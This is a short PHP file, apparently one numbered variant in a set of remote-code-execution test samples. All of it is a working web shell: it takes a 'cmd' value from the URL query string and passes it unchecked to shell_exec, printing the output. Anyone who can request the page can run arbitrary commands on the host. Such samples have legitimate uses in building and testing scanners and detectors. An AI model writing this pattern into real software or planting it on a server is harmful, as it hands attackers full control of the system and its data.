<?php
// RCE test variation #545
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>